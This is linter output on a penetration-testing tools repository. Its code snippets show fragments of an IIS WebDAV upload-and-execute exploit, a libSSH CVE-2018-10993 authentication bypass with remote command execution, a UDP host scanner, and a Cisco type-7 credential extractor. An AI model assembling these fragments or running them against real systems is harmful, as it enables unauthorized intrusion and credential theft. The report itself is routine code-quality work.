    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
196 | ΓÇª                         HOSTS_UP.add(host)
    |
help: Convert to f-string

W293 [*] Blank line contains whitespace
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:197:1
    |
195 |                                 print('[+] HOST IS UP: {}'.format(host))
196 |                                 HOSTS_UP.add(host)
197 |                 
    | ^^^^^^^^^^^^^^^^
198 |                 if DEBUG:
199 |                     print(packetPrint)
    |
help: Remove whitespace from blank line

F821 Undefined name `unicode`
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:206:35
    |
204 | def hexdump(src, length = 16):
205 |     result = []
206 |     digits = 4 if isinstance(src, unicode) else 2
    |                                   ^^^^^^^
207 |     num = len(src)
    |

W293 [*] Blank line contains whitespace
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:208:1
    |
206 |     digits = 4 if isinstance(src, unicode) else 2
207 |     num = len(src)
208 |     
    | ^^^^
209 |     for i in range(0, num, length):
210 |         s = src[i:i+length]
    |
help: Remove whitespace from blank line

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:211:27
    |
209 |     for i in range(0, num, length):
210 |         s = src[i:i+length]
211 |         hexa = b' '.join(['%0*X' % (digits, ord(x)) for x in s])
    |                           ^^^^^^
212 |         text = b''.join([x if 0x20 <= ord(x) < 0x7f else b'.' for x in s])
    |
help: Replace with format specifiers

W293 [*] Blank line contains whitespace
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:213:1
    |
211 |         hexa = b' '.join(['%0*X' % (digits, ord(x)) for x in s])
212 |         text = b''.join([x if 0x20 <= ord(x) < 0x7f else b'.' for x in s])
213 |         
    | ^^^^^^^^
214 |         result.append(b'%04x  |  %-*s  |  %s' % (i, length * (digits + 1), hexa, text)) 
    |
help: Remove whitespace from blank line

W291 [*] Trailing whitespace
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:214:88
    |
212 |         text = b''.join([x if 0x20 <= ord(x) < 0x7f else b'.' for x in s])
213 |         
214 |         result.append(b'%04x  |  %-*s  |  %s' % (i, length * (digits + 1), hexa, text)) 
    |                                                                                        ^
215 |
216 |     return '\n'.join(result)
    |
help: Remove trailing whitespace

N806 Variable `bindAddr` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:225:5
    |
223 |         sys.exit(1)
224 |
225 |     bindAddr = sys.argv[1]
    |     ^^^^^^^^
226 |     subnet = sys.argv[2]
    |

N806 Variable `sockProto` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:228:5
    |
226 |     subnet = sys.argv[2]
227 |
228 |     sockProto = None
    |     ^^^^^^^^^
229 |     if os.name == 'nt':
230 |         sockProto = socket.IPPROTO_IP
    |

SIM108 Use ternary operator `sockProto = socket.IPPROTO_IP if os.name == 'nt' else socket.IPPROTO_ICMP` instead of `if`-`else`-block
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:229:5
    |
228 |       sockProto = None
229 | /     if os.name == 'nt':
230 | |         sockProto = socket.IPPROTO_IP
231 | |     else:
232 | |         sockProto = socket.IPPROTO_ICMP
    | |_______________________________________^
233 |
234 |       sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, sockProto)
    |
help: Replace `if`-`else`-block with `sockProto = socket.IPPROTO_IP if os.name == 'nt' else socket.IPPROTO_ICMP`

N806 Variable `sockProto` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:230:9
    |
228 |     sockProto = None
229 |     if os.name == 'nt':
230 |         sockProto = socket.IPPROTO_IP
    |         ^^^^^^^^^
231 |     else:
232 |         sockProto = socket.IPPROTO_ICMP
    |

N806 Variable `sockProto` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:232:9
    |
230 |         sockProto = socket.IPPROTO_IP
231 |     else:
232 |         sockProto = socket.IPPROTO_ICMP
    |         ^^^^^^^^^
233 |
234 |     sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, sockProto)
    |

E701 Multiple statements on one line (colon)
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:235:13
    |
234 |     sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, sockProto)
235 |     if DEBUG: print('[.] Binding on {}:0'.format(bindAddr))
    |             ^
236 |     sniffer.bind((bindAddr, 0))
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:235:21
    |
234 |     sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, sockProto)
235 |     if DEBUG: print('[.] Binding on {}:0'.format(bindAddr))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
236 |     sniffer.bind((bindAddr, 0))
    |
help: Convert to f-string

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:245:16
    |
243 |         try:
244 |             sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
245 |         except socket.error, e:
    |                ^^^^^^^^^^^^^^^
246 |             print('[!] Could not set promiscous mode ON: "{}"'.format(str(e)))
    |

UP024 [*] Replace aliased errors with `OSError`
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:245:16
    |
243 |         try:
244 |             sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
245 |         except socket.error, e:
    |                ^^^^^^^^^^^^^^^
246 |             print('[!] Could not set promiscous mode ON: "{}"'.format(str(e)))
    |
help: Replace with builtin `OSError`

F821 Undefined name `e`
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:245:30
    |
243 |         try:
244 |             sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
245 |         except socket.error, e:
    |                              ^
246 |             print('[!] Could not set promiscous mode ON: "{}"'.format(str(e)))
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:246:19
    |
244 |             sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
245 |         except socket.error, e:
246 |             print('[!] Could not set promiscous mode ON: "{}"'.format(str(e)))
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
247 |
248 |     # Sending thread
    |
help: Convert to f-string

F821 Undefined name `e`
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:246:75
    |
244 |             sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
245 |         except socket.error, e:
246 |             print('[!] Could not set promiscous mode ON: "{}"'.format(str(e)))
    |                                                                           ^
247 |
248 |     # Sending thread
    |

N806 Variable `recvThread` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:252:5
    |
251 |     # Receiving thread
252 |     recvThread = threading.Thread(target=processPackets, args=(sniffer, subnet))
    |     ^^^^^^^^^^
253 |     recvThread.daemon = True
254 |     recvThread.start()
    |

E701 Multiple statements on one line (colon)
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:257:13
    |
256 |     time.sleep(15)
257 |     if DEBUG: print('[.] Breaking response wait loop.')
    |             ^
258 |
259 |     # Turn off promiscous mode
    |

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:263:16
    |
261 |         try:
262 |             sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
263 |         except socket.error, e:
    |                ^^^^^^^^^^^^^^^
264 |             pass
    |

UP024 [*] Replace aliased errors with `OSError`
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:263:16
    |
261 |         try:
262 |             sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
263 |         except socket.error, e:
    |                ^^^^^^^^^^^^^^^
264 |             pass
    |
help: Replace with builtin `OSError`

F821 Undefined name `e`
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:263:30
    |
261 |         try:
262 |             sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
263 |         except socket.error, e:
    |                              ^
264 |             pass
    |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:14:11
   |
12 | if __name__ == '__main__':
13 |   if len(sys.argv) != 3:
14 |     print 'Usage: webdav_upload.py <host> <inputfile>'
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
15 |     sys.exit(0)
   |

W293 Blank line contains whitespace
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:25:1
   |
23 |               sc += '\r\nsc = sc'
24 |           sc += '&Chr(%d)' % ord(bytes[i])
25 |           
   | ^^^^^^^^^^
26 |   put_request = '''<%% @language="VBScript" %%>
27 | <%% 
   |
help: Remove whitespace from blank line

W291 Trailing whitespace
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:27:4
   |
26 |   put_request = '''<%% @language="VBScript" %%>
27 | <%% 
   |    ^
28 |     Sub webdav_upload()
29 |         Dim fs
   |
help: Remove trailing whitespace

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:52:9
   |
50 | %%>''' % {'shellcode' : sc}
51 |
52 |   print '\n\tMicrosoft IIS WebDAV Write Code Execution exploit'
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
53 |   print '\t(based on Metasploit HDM\'s <iis_webdav_upload_asp> implementation)'
54 |   print '\tMariusz Banach / mgeeky, 2016\n'
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:53:9
   |
52 |   print '\n\tMicrosoft IIS WebDAV Write Code Execution exploit'
53 |   print '\t(based on Metasploit HDM\'s <iis_webdav_upload_asp> implementation)'
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
54 |   print '\tMariusz Banach / mgeeky, 2016\n'
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:54:9
   |
52 |   print '\n\tMicrosoft IIS WebDAV Write Code Execution exploit'
53 |   print '\t(based on Metasploit HDM\'s <iis_webdav_upload_asp> implementation)'
54 |   print '\tMariusz Banach / mgeeky, 2016\n'
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
55 |
56 |   host = sys.argv[1]
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:61:9
   |
59 |   outname = '/file' + randstring(6) + '.asp;.txt'
60 |
61 |   print 'Step 0: Checking if file already exist: "%s"' % (host + outname)
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
62 |   r = requests.get(host + outname)
63 |   if r.status_code == requests.codes.ok:
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:64:11
   |
62 |   r = requests.get(host + outname)
63 |   if r.status_code == requests.codes.ok:
64 |     print 'Resource already exists. Exiting...'
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
65 |     sys.exit(1)
66 |   else:
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:67:11
   |
65 |     sys.exit(1)
66 |   else:
67 |     print '[*] File does not exists. That\'s good.'
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
68 |
69 |   print '\nStep 1: Upload file with improper name: "%s"' % (host + outname)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:69:9
   |
67 |     print '[*] File does not exists. That\'s good.'
68 |
69 |   print '\nStep 1: Upload file with improper name: "%s"' % (host + outname)
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
70 |   print '\tSending %d bytes, this will take a while. Hold tight Captain!' % len(put_request)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:70:9
   |
69 |   print '\nStep 1: Upload file with improper name: "%s"' % (host + outname)
70 |   print '\tSending %d bytes, this will take a while. Hold tight Captain!' % len(put_request)
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
71 |
72 |   r = requests.request('put', host + outname, data=put_request, headers={'Content-Type':'application/octet-stream'})
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:75:11
   |
74 |   if r.status_code < 200 or r.status_code >= 300:
75 |     print '[!] Upload failed. Status: ' + str(r.status_code)
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
76 |     sys.exit(1)
77 |   else:
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:78:11
   |
76 |     sys.exit(1)
77 |   else:
78 |     print '[+] File uploaded.'
   |           ^^^^^^^^^^^^^^^^^^^^
79 |
80 |   newname = outname.replace(';.txt', '')
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:81:9
   |
80 |   newname = outname.replace(';.txt', '')
81 |   print '\nStep 2: Moving file from: "%s" to "%s"' % (outname, newname)
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
82 |
83 |   r = requests.request('move', host + outname, headers={'Destination':newname})
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:86:11
   |
85 |   if r.status_code < 200 or r.status_code >= 300:
86 |     print '[!] Renaming operation failed. Status: ' + str(r.status_code)
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
87 |     sys.exit(1)
88 |   else:
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:89:11
   |
87 |     sys.exit(1)
88 |   else:
89 |     print '[+] File renamed, splendid my lord.'
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
90 |
91 |   print '\nStep 3: Executing resulted payload file (%s).' % (host + newname)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:91:9
   |
89 |     print '[+] File renamed, splendid my lord.'
90 |
91 |   print '\nStep 3: Executing resulted payload file (%s).' % (host + newname)
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
92 |   r = requests.get(host + newname)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:95:11
   |
94 |   if r.status_code < 200 or r.status_code >= 300:
95 |     print '[!] Execution failed. Status: ' + str(r.status_code)
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
96 |     print '[!] Response: ' + r.text
97 |     sys.exit(1)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:96:11
   |
94 |   if r.status_code < 200 or r.status_code >= 300:
95 |     print '[!] Execution failed. Status: ' + str(r.status_code)
96 |     print '[!] Response: ' + r.text
   |           ^^^^^^^^^^^^^^^^
97 |     sys.exit(1)
98 |   else:
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\iis_webdav_upload.py:99:11
   |
97 |     sys.exit(1)
98 |   else:
99 |     print '[+] File has been launched. Game over.'
   |           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

F401 [*] `sys.argv` imported but unused
  --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:35:17
   |
33 | import sys
34 | import time
35 | from sys import argv, exit
   |                 ^^^^
36 |
37 | try:
   |
help: Remove unused import

F401 [*] `sys.exit` imported but unused
  --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:35:23
   |
33 | import sys
34 | import time
35 | from sys import argv, exit
   |                       ^^^^
36 |
37 | try:
   |
help: Remove unused import

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:114:25
    |
112 |         if not self.connectionInfoOnce:
113 |             self.connectionInfoOnce = True
114 |             Logger.info("Connecting with {}:{} ...".format(self.host, self.port))
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
115 |
116 |         try:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:121:17
    |
119 |           except Exception as e:
120 |               Logger.fail(
121 | /                 "Could not connect to {}:{} . Exception: {}".format(
122 | |                     self.host, self.port, str(e)
123 | |                 )
    | |_________________^
124 |               )
125 |               sys.exit(1)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:148:18
    |
146 |         hostname = UnauthSSH._send_recv(session, "hostname")
147 |
148 |         prompt = "{}@{} $ ".format(username, hostname)
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
149 |
150 |         while True:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:171:18
    |
169 |         hostname = self.execute("hostname")
170 |
171 |         prompt = "{}@{} $ ".format(username, hostname)
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
172 |
173 |         if not username or not hostname:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:175:17
    |
173 |           if not username or not hostname:
174 |               Logger.fail(
175 | /                 "Could not obtain username ({}) and/or hostname ({})!".format(
176 | |                     username, hostname
177 | |                 )
    | |_________________^
178 |               )
179 |               return
    |
help: Convert to f-string

N806 Variable `MAX_TIMEOUT` in function should be lowercase
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:202:9
    |
200 |         session.send(cmd.strip() + "\n")
201 |
202 |         MAX_TIMEOUT = config["session_timeout"]
    |         ^^^^^^^^^^^
203 |         timeout = 0.0
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:226:20
    |
224 |         inp = inp.strip()
225 |
226 |         Logger.dbg('Executing command: "{}"'.format(inp))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
227 |         session.exec_command(inp + "\n")
    |
help: Convert to f-string

F841 Local variable `retcode` is assigned to but never used
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:229:9
    |
227 |         session.exec_command(inp + "\n")
228 |
229 |         retcode = session.recv_exit_status()
    |         ^^^^^^^
230 |         buf = ""
    |
help: Remove assignment to unused variable `retcode`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:236:20
    |
235 |         buf = buf.strip()
236 |         Logger.dbg("Returned:\n{}".format(buf))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^
237 |         return buf
    |
help: Convert to f-string

N803 Argument name `tryAgain` should be lowercase
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:239:44
    |
237 |         return buf
238 |
239 |     def execute(self, cmd, printout=False, tryAgain=False):
    |                                            ^^^^^^^^^^^^^^
240 |         transport = self.sshAuthBypass(force=tryAgain)
241 |         session = transport.open_session(timeout=config["session_timeout"])
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:252:29
    |
251 |             if printout and not tryAgain:
252 |                 Logger.fail('Could not execute command ({}): "{}"'.format(cmd, str(e)))
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
253 |             return ""
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:256:19
    |
255 |         if printout:
256 |             print("\n{} $ {}".format(self.host, cmd))
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
257 |             print("{}".format(buf))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:257:19
    |
255 |         if printout:
256 |             print("\n{} $ {}".format(self.host, cmd))
257 |             print("{}".format(buf))
    |                   ^^^^^^^^^^^^^^^^
258 |
259 |         return buf
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:278:19
    |
276 |     try:
277 |         s = socket.create_connection((ip, port), timeout=config["connection_timeout"])
278 |         Logger.ok("Connected to the target: {}:{}".format(ip, port))
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
279 |         s.settimeout(None)
280 |         banner = s.recv(config["buflen"])
    |
help: Convert to f-string

UP024 [*] Replace aliased errors with `OSError`
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:284:12
    |
282 |         return banner.split(b"\n")[0]
283 |
284 |     except (socket.timeout, socket.error) as e:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
285 |         Logger.fail("SSH connection timeout.")
286 |         return ""
    |
help: Replace with builtin `OSError`

UP041 [*] Replace aliased errors with `TimeoutError`
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:284:12
    |
282 |         return banner.split(b"\n")[0]
283 |
284 |     except (socket.timeout, socket.error) as e:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
285 |         Logger.fail("SSH connection timeout.")
286 |         return ""
    |
help: Replace with builtin `TimeoutError`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:284:46
    |
282 |         return banner.split(b"\n")[0]
283 |
284 |     except (socket.timeout, socket.error) as e:
    |                                              ^
285 |         Logger.fail("SSH connection timeout.")
286 |         return ""
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:297:21
    |
296 |     if banner:
297 |         Logger.info('Obtained banner: "{}"'.format(banner.decode().strip()))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
298 |
299 |         #
    |
help: Convert to f-string

E722 Do not use bare `except`
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:376:5
    |
374 |             raise Exception()
375 |
376 |     except:
    |     ^^^^^^
377 |         parser.print_help()
378 |         return False
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:385:9
    |
383 |   def main():
384 |       sys.stderr.write(
385 | /         """
386 | |     :: CVE-2018-10993 libSSH authentication bypass exploit.
387 | |     Tries to attack vulnerable libSSH libraries by accessing SSH server without prior authentication.
388 | |     Mariusz Banach / mgeeky '18, <mb@binary-offensive.com>
389 | |     v{}
390 | |     
391 | | """.format(
392 | |             VERSION
393 | |         )
    | |_________^
394 |       )
395 |       if not parse_opts():
    |
help: Convert to f-string

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\networks\libssh-auth-bypass.py:390:1
    |
388 |     Mariusz Banach / mgeeky '18, <mb@binary-offensive.com>
389 |     v{}
390 |     
    | ^^^^
391 | """.format(
392 |             VERSION
    |
help: Remove whitespace from blank line

N816 Variable `foundCreds` in global scope should not be mixedCase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:117:1
    |
115 | }
116 |
117 | foundCreds = set()
    | ^^^^^^^^^^
118 |
119 | maxTechnologyWidth = 0
    |

N816 Variable `maxTechnologyWidth` in global scope should not be mixedCase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:119:1
    |
117 | foundCreds = set()
118 |
119 | maxTechnologyWidth = 0
    | ^^^^^^^^^^^^^^^^^^
120 | maxRegexpWidth = 0
    |

N816 Variable `maxRegexpWidth` in global scope should not be mixedCase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:120:1
    |
119 | maxTechnologyWidth = 0
120 | maxRegexpWidth = 0
    | ^^^^^^^^^^^^^^
121 |
122 | results = []
    |

N803 Argument name `inputRegex` should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:157:18
    |
157 | def processRegex(inputRegex):
    |                  ^^^^^^^^^^
158 |     for marker in markers:
159 |         if "\\" + marker in inputRegex:
    |

N806 Variable `inputRegex` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:160:13
    |
158 |     for marker in markers:
159 |         if "\\" + marker in inputRegex:
160 |             inputRegex = inputRegex.replace("\\" + marker, markers[marker])
    |             ^^^^^^^^^^
161 |
162 |     inputRegex = "^\\s*{}\\s*.*$".format(inputRegex)
    |

N806 Variable `inputRegex` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:162:5
    |
160 |             inputRegex = inputRegex.replace("\\" + marker, markers[marker])
161 |
162 |     inputRegex = "^\\s*{}\\s*.*$".format(inputRegex)
    |     ^^^^^^^^^^
163 |     return inputRegex
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:162:18
    |
160 |             inputRegex = inputRegex.replace("\\" + marker, markers[marker])
161 |
162 |     inputRegex = "^\\s*{}\\s*.*$".format(inputRegex)
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
163 |     return inputRegex
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:235:31
    |
233 |                 if s <= 50:
234 |                     # xlat length is 51
235 |                     newchar = "%c" % (magic ^ xlat[s])
    |                               ^^^^
236 |                     s += 1
237 |                 if s == 51:
    |
help: Replace with format specifiers

E722 Do not use bare `except`
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:242:5
    |
240 |             return dp
241 |         return ""
242 |     except:
    |     ^^^^^^
243 |         return ""
    |

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:252:41
    |
250 |     decrypted = []
251 |     for m in re.finditer(markers["cisco7"], creds, re.I):
252 |         f = m.group(2) if m.group(2) != None else m.group(1)
    |                                         ^^^^
253 |         out = cisco7Decrypt(f)
254 |         if out:
    |
help: Replace with `cond is not None`

N806 Variable `processedRex` in function should be lowercase
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:276:13
    |
274 |                 continue
275 |
276 |             processedRex = processRegex(regexes[technology][rex])
    |             ^^^^^^^^^^^^
277 |             matched = re.match(processedRex, line, re.I)
278 |             if matched:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:282:54
    |
281 |                 foundCreds.add(line)
282 |                 f = [x for x in matched.groups(1) if type(x) == str]
    |                                                      ^^^^^^^^^^^^^^
283 |                 creds = '", "'.join(f)
284 |                 creds += tryToCisco7Decrypt(line)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:289:33
    |
288 |                 if config["lines"] != 0:
289 |                     Logger._out("\n[+] {}: {}: {}".format(technology, rex, creds))
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
290 |
291 |                     if idx - config["lines"] >= 0:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:293:41
    |
291 |                     if idx - config["lines"] >= 0:
292 |                         for i in range(idx - config["lines"], idx):
293 |                             Logger._out("[{:04}]\t\t{}".format(i, lines[i]))
    |                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
294 |
295 |                     Logger._out("[{:04}]==>\t{}".format(idx, line))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:295:33
    |
293 |                             Logger._out("[{:04}]\t\t{}".format(i, lines[i]))
294 |
295 |                     Logger._out("[{:04}]==>\t{}".format(idx, line))
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
296 |
297 |                     if idx + 1 + config["lines"] < len(lines):
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:299:41
    |
297 |                     if idx + 1 + config["lines"] < len(lines):
298 |                         for i in range(idx + 1, idx + config["lines"] + 1):
299 |                             Logger._out("[{:04}]\t\t{}".format(i, lines[i]))
    |                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
300 |
301 |                 Logger.dbg("\tRegex used: [ {} ]".format(processedRex))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\networkConfigurationCredentialsExtract.py:301:28
    |
299 |                             Logger._out("[{:04}]\t\t{}".format(i, lines[i]))
300 |
